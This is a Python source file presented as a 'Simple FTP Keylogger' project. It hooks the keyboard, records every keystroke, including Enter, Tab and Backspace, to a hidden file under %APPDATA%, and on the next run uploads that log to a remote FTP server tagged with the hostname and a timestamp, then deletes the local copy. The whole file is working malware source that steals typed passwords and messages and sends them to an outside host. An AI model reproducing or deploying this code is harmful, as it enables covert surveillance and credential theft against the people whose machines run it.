"""
Simple FTP Keylogger project v1.0 by Alex Avlonitis http://alex.avlonitis.me
"""
from ftplib import FTP
#import win32api 
import sys
#import pythoncom, pyHook 
import os
import datetime, time
import socket
 
appdata = os.getenv('APPDATA')
keyfile = appdata+os.path.sep+'keys.txt'
data=""
ts = datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S')
hn = socket.gethostname()
 
if os.path.exists(keyfile):
    fp = open(keyfile,'r')
    ftp = FTP("your ftp server")
    ftp.login("username","password")
    ftp.cwd("Folder name") # The folder you want your files to be stored on the ftp server 
    ftp.storbinary("STOR keys-"+hn+"-"+str(ts)+"txt", fp, 1024) # Upload it on ftp, and append the filename with the hostname + current date
    ftp.quit()
    fp.close()
    os.remove(keyfile) # Delete the file after the ftp upload
else:
    fp = open(keyfile,'w') # Stores the keystrokes under %appdata%
     
def keypressed(event):
    global data
    if event.Ascii==13:
        keys='<ENTER>\n'
        fp=open(keyfile,'a')
        data=keys
        fp.write(data)
        fp.close()
    elif event.Ascii==8:
        keys='<BACK SPACE>'
        fp=open(keyfile,'a')
        data=keys
        fp.write(data)
        fp.close()
    elif event.Ascii==9:
        keys='<TAB>'
        fp=open(keyfile,'a')
        data=keys
        fp.write(data)
        fp.close()
    elif event.Ascii==27:
        raise SystemExit # Stop the script if you press esc
    else:
        keys=chr(event.Ascii)
        fp=open(keyfile,'a')
        data=keys
        fp.write(data)
        fp.close()
     
obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()